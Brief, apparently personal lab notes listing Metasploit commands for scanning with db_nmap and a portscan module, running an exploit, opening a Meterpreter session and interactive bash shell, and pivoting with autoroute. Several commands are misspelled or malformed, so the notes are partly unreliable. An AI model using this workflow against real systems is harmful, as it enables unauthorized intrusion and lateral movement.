service postgresql start

msfconsole

db_status

workspace -a Wink2k21 (create a workspace an usiing) 

db_import /root/windows_server_2012 (output file .xml)

hosts

services

sessions

wokspace -a Nmap_task

db_nmap -Pn - sV -O 10.4.22.173 (LHOST)

vunls

search portscan

search udep_sweep

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit

show options

run

curl 192.168.1.5

exploit

--Meterpreteer
sysinfo

shell

/bin/bash -i

ifconfig

run autoroute -s 192.168.1.123

background
